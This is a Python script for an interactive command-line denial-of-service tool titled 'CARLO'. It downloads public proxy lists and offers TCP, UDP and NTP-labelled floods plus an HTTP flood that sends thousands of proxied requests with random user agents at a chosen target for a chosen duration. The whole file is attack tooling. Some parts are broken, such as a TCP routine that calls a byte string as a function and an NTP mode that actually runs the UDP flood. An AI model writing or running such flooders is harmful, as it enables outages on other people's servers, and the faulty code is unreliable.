import requests
import asyncio
from flask import Flask, render_template, request,jsonify
from datetime import datetime
import sqlite3
from fake_useragent import UserAgent
from time import sleep as ssleep
import datetime
from bs4 import BeautifulSoup
import random, requests
from pyfiglet import Figlet
from termcolor import colored, cprint
import asyncio
import aiohttp
from colorama import init, Fore, Back, Style
import os
import time
import pyfiglet
import socket 
import ntplib
from time import ctime
import string
import socks

ua = UserAgent()
tasks = []

proxies = requests.get("https://www.proxy-list.download/api/v1/get?type=http").text.strip().split('\r\n')
http_proxies = requests.get("https://www.proxy-list.download/api/v1/get?type=https").text.strip().split('\r\n')
print(http_proxies)

def __paste__(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length)).encode()

async def __tcp__(ip, port, until_datetime):
	while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
	   try:
	   	prox = random.choice(proxies)
	   	prox = f"{prox}".split(':')
	   	print(prox)
	   	prx = prox[0]
	   	prxp = int(prox[1])
	   	message = __paste__(10)
	   	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_socket:
	   		tcp_socket.settimeout(5)
	   		tcp_socket.connect(message(ip, port))
	   		print(colored(f'Connected to ip={ip} port={port} protocol=TCP', color='green'))
	   except Exception as e:
	   	print(colored(e, color='red'))

async def sender(ip, port, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            message = __paste__(10)
            sock.sendto(message, (ip, port))
            print(colored(f'msg={message.decode()} to ip={ip} port={port} protocol=UDP', color='green'))
        except Exception as e:
            print(colored(e, color='red'))
            break
    sock.close()

async def makerequest(ip, port, proxy):
	try:
		        async with aiohttp.ClientSession() as session:
		        	for _ in range(50):
		        		async with session.get(ip, headers={"User-Agent": ua.random}, proxy=f"http://{proxy}", timeout=40) as response:
		        			print(colored(f"Connected to ip={ip} port={port} protocol=HTTP", color="green"))
	except Exception as e:
		print(e)

async def httpflood(ip, port, until_datetime):
	while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
		for _ in range(2500):
			proxy = random.choice(proxies)
			tasks.append(makerequest(ip, port, proxy))
		await asyncio.gather(*tasks)

async def __udp__(ip, port, until_datetime):
	while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
	   try:
	       with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:
	       	udp_socket.settimeout(5)
	       	message = __paste__(10)
	       	udp_socket.sendto(message, (ip, port))
	       	print(colored(f'msg={message} ip={ip} port={port} protocol=UDP', color='green'))
	   except Exception as e:
	   	print(colored(e, color='red'))

async def __ntp__(ip, port):
    try:
        client = ntplib.NTPClient()
        r = client.request(ip, port)
        print(colored(f'ip={ip} port={port} protocol=NTP', color='green'))
    except Exception as e:
    	print(colored(e, color='red'))

async def osmenu():
	os.system('clear')
	banner = Figlet(font="banner3-D")
	banner = banner.renderText('   CARLO   ')
	banner = colored(banner, color='red')
	menu = colored(f"                  [ Layer4 ] -- Methods:\n\n                  [ (nv) TCP â tcp -i 127.0.0.1 -p 80 -t 60 ]\n                  [ (nv) UDP â udp -i 127.0.0.1 -p 80 -t 60 ]\n                  [ (nv) NTP â ntp -i 127.0.0.1 -p 80 -t 60 ]\n\n                  [ Layer 7 ] -- Methods:\n\n                  [ (nv) http-v1 â http -i http://google.com -p 80 -t 60", color="green")
	print(banner)
	print(menu)

async def main():
	os.system('clear')
	banner = Figlet(font="banner3-D")
	banner = banner.renderText('   CARLO   ')
	banner = colored(banner, color='red')
	menu = colored(f"                  [ Layer4 ] -- Methods:\n\n                  [ (nv) TCP â tcp -i 127.0.0.1 -p 80 -t 60 ]\n                  [ (nv) UDP â udp -i 127.0.0.1 -p 80 -t 60 ]\n                  [ (nv) NTP â ntp -i 127.0.0.1 -p 80 -t 60 ]\n\n                  [ Layer 7 ] -- Methods:\n\n                  [ (nv) http-v1 â http -i http://google.com -p 80 -t 60", color="green")
	print(banner)
	print(menu)
	howto = input(colored(f"\n\n[@user] >> ", color="blue"))

	if howto == '':
		pass

	elif 'tcp' in howto:
		await osmenu()
		args = howto.split()
		ip = None
		port = 80
		for i in range(len(args)):
		    if args[i] == '-i':
		    	ip = args[i + 1]
		    elif args[i] == '-p':
		    	port = int(args[i + 1])
		    elif args[i] == '-t':
		    	second = int(args[i + 1])
		until_datetime = datetime.datetime.now() + datetime.timedelta(seconds=second)
		for _ in range(1):
			tasks.append(__tcp__(ip, port, until_datetime))
		os.system('clear')
		await asyncio.gather(*tasks)

	elif 'udp' in howto:
		await osmenu()
		args = howto.split()
		ip = None
		port = 53
		for i in range(len(args)):
		    if args[i] == '-i':
		    	ip = args[i + 1]
		    elif args[i] == '-p':
		    	port = int(args[i + 1])
		    elif args[i] == '-t':
		    	second = int(args[i + 1])
		for _ in range(1):
			until_datetime = datetime.datetime.now() + datetime.timedelta(seconds=second)
			tasks.append(__udp__(ip, port, until_datetime))
		os.system('clear')
		await asyncio.gather(*tasks)

	elif 'ntp' in howto:
		args = howto.split()
		ip = None
		port = None
		for i in range(len(args)):
		    if args[i] == '-i':
		    	ip = args[i + 1] # url/ip
		    elif args[i] == '-p':
		    	port = int(args[i + 1]) # port
		    elif args[i] == '-t':
		    	second = int(args[i + 1]) #second t
		await osmenu()
		for _ in range(1):
			until_datetime = datetime.datetime.now() + datetime.timedelta(seconds=second)
			tasks.append(__udp__(ip, port, until_datetime))
		os.system('clear')
		await asyncio.gather(*tasks)

	elif 'http' in howto:
		args = howto.split()
		ip = None
		port = None
		for i in range(len(args)):
		    if args[i] == '-i':
		    	ip = args[i + 1]
		    elif args[i] == '-p':
		    	port = int(args[i + 1])
		    elif args[i] == '-t':
		    	second = int(args[i + 1])
		await osmenu()
		until_datetime = datetime.datetime.now() + datetime.timedelta(seconds=second)
		while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
			for _ in range(1):
				tasks.append(httpflood(ip, port, until_datetime))
			os.system('clear')
			await asyncio.gather(*tasks)
	else:
		pass

asyncio.run(main())
